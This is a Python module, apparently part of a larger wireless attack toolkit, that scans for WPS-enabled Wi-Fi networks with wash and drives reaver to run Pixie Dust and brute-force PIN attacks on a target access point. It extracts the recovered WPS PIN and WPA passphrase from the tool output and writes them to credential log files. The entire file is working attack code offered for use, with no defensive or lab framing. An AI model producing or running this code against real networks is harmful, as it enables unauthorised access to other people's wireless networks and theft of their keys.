#!/usr/bin/env python3
"""
WPS (Wi-Fi Protected Setup) Attack Module
Implements Pixie Dust and brute force attacks
"""

import subprocess
import threading
import time  # ADD THIS IMPORT
import re
from colorama import Fore, Style
import logging
import os

class WPSAttacker:
    def __init__(self, interface):
        self.interface = interface
        self.is_attacking = False
        self.current_target = None
        self.attack_thread = None
        self.logger = logging.getLogger('wps_attacker')
        
        # Check for required tools
        self.tools_available = self.check_tools()
    
    def check_tools(self):
        """Check if required WPS tools are available"""
        required_tools = ['wash', 'reaver', 'bully']
        available = []
        
        for tool in required_tools:
            try:
                subprocess.run(['which', tool], check=True,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                available.append(tool)
            except subprocess.CalledProcessError:
                self.logger.warning(f"Tool not available: {tool}")
        
        if not available:
            print(f"{Fore.RED}[-] No WPS attack tools available. Install reaver or bully.{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.GREEN}[+] Available WPS tools: {', '.join(available)}{Style.RESET_ALL}")
        return True
    
    def scan_wps_networks(self, duration=30):
        """Scan for WPS-enabled networks using wash"""
        print(f"{Fore.CYAN}[*] Scanning for WPS-enabled networks...{Style.RESET_ALL}")
        
        try:
            # Run wash to find WPS-enabled networks
            result = subprocess.run([
                'wash', '-i', self.interface, '-s'
            ], capture_output=True, text=True, timeout=duration+5)
            
            networks = self.parse_wash_output(result.stdout)
            
            if networks:
                print(f"{Fore.GREEN}[+] Found {len(networks)} WPS-enabled networks:{Style.RESET_ALL}")
                for i, net in enumerate(networks, 1):
                    lock_status = "🔓" if net['locked'] == "No" else "🔒"
                    print(f"  {i}. {lock_status} {net['ssid']} - {net['bssid']} - Ch{net['channel']} - {net['wps_version']}")
                
                return networks
            else:
                print(f"{Fore.YELLOW}[-] No WPS-enabled networks found{Style.RESET_ALL}")
                return []
                
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[-] WPS scan timed out{Style.RESET_ALL}")
            return []
        except Exception as e:
            print(f"{Fore.RED}[-] WPS scan failed: {e}{Style.RESET_ALL}")
            return []
    
    def parse_wash_output(self, output):
        """Parse wash command output"""
        networks = []
        lines = output.split('\n')
        
        # Find the start of the network list
        start_index = -1
        for i, line in enumerate(lines):
            if 'BSSID' in line and 'Channel' in line:
                start_index = i + 1
                break
        
        if start_index == -1:
            return networks
        
        # Parse network entries
        for line in lines[start_index:]:
            if not line.strip():
                continue
                
            # Parse line format
            parts = line.split()
            if len(parts) >= 7:
                try:
                    network = {
                        'bssid': parts[0],
                        'channel': int(parts[1]),
                        'rssi': int(parts[3]),
                        'wps_version': parts[4],
                        'locked': parts[5],
                        'ssid': ' '.join(parts[6:]) if len(parts) > 6 else 'Unknown'
                    }
                    networks.append(network)
                except (ValueError, IndexError):
                    continue
        
        return networks
    
    def pixie_dust_attack(self, bssid, channel):
        """Perform Pixie Dust attack using reaver"""
        print(f"{Fore.CYAN}[*] Starting Pixie Dust attack on {bssid}{Style.RESET_ALL}")
        
        try:
            # Run reaver with pixie dust options
            cmd = [
                'reaver', '-i', self.interface, '-b', bssid, '-c', str(channel),
                '-K', '1', '-N', '-vv'
            ]
            
            self.is_attacking = True
            self.current_target = bssid
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Monitor output for results
            while self.is_attacking:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    print(f"    {line.strip()}")
                    
                    # Check for successful PIN recovery
                    if 'WPS PIN:' in line:
                        pin_match = re.search(r'WPS PIN:\s*[\'"]?([0-9]{8})[\'"]?', line)
                        if pin_match:
                            pin = pin_match.group(1)
                            print(f"{Fore.GREEN}[+] WPS PIN found: {pin}{Style.RESET_ALL}")
                            
                        # Extract PSK if available
                        psk_match = re.search(r'WPA PSK:\s*[\'"]([^\'"]+)[\'"]', line)
                        if psk_match:
                            psk = psk_match.group(1)
                            print(f"{Fore.GREEN}[+] WPA PSK found: {psk}{Style.RESET_ALL}")
                            self.save_credentials(bssid, pin, psk)
                    
                    # Check for errors
                    if 'FAIL' in line or 'ERROR' in line:
                        print(f"{Fore.RED}[-] Attack failed: {line.strip()}{Style.RESET_ALL}")
                        break
            
            process.terminate()
            
        except Exception as e:
            print(f"{Fore.RED}[-] Pixie Dust attack failed: {e}{Style.RESET_ALL}")
        finally:
            self.is_attacking = False
            self.current_target = None
    
    def brute_force_attack(self, bssid, channel, timeout=300):
        """Brute force WPS PIN attack"""
        print(f"{Fore.CYAN}[*] Starting brute force WPS attack on {bssid}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Timeout: {timeout} seconds{Style.RESET_ALL}")
        
        try:
            cmd = [
                'reaver', '-i', self.interface, '-b', bssid, '-c', str(channel),
                '-N', '-S', '-vv', '-T', '2', '-t', '5'
            ]
            
            self.is_attacking = True
            self.current_target = bssid
            
            start_time = time.time()
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Monitor with timeout
            while self.is_attacking and (time.time() - start_time) < timeout:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    # Show progress
                    if 'progress' in line.lower():
                        print(f"    {line.strip()}")
                    
                    # Check for success
                    if 'WPS PIN:' in line:
                        pin_match = re.search(r'WPS PIN:\s*[\'"]?([0-9]{8})[\'"]?', line)
                        if pin_match:
                            pin = pin_match.group(1)
                            print(f"{Fore.GREEN}[+] WPS PIN found: {pin}{Style.RESET_ALL}")
                            
                        psk_match = re.search(r'WPA PSK:\s*[\'"]([^\'"]+)[\'"]', line)
                        if psk_match:
                            psk = psk_match.group(1)
                            print(f"{Fore.GREEN}[+] WPA PSK found: {psk}{Style.RESET_ALL}")
                            self.save_credentials(bssid, pin, psk)
                            break
                
                time.sleep(0.1)
            
            # Timeout or completion
            if (time.time() - start_time) >= timeout:
                print(f"{Fore.YELLOW}[-] Brute force attack timed out{Style.RESET_ALL}")
            
            process.terminate()
            
        except Exception as e:
            print(f"{Fore.RED}[-] Brute force attack failed: {e}{Style.RESET_ALL}")
        finally:
            self.is_attacking = False
            self.current_target = None
    
    def save_credentials(self, bssid, pin, psk):
        """Save recovered credentials to file"""
        cred_file = f"logs/credentials/wps_recovery_{int(time.time())}.txt"
        
        credential_data = f"""WPS Credentials Recovery
========================
BSSID: {bssid}
WPS PIN: {pin}
WPA PSK: {psk}
Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        with open(cred_file, 'w') as f:
            f.write(credential_data)
        
        print(f"{Fore.GREEN}[+] Credentials saved to: {cred_file}{Style.RESET_ALL}")
    
    def stop_attack(self):
        """Stop current WPS attack"""
        if self.is_attacking:
            print(f"{Fore.CYAN}[*] Stopping WPS attack{Style.RESET_ALL}")
            self.is_attacking = False
    
    def get_attack_status(self):
        """Get current attack status"""
        return {
            'is_attacking': self.is_attacking,
            'current_target': self.current_target
        }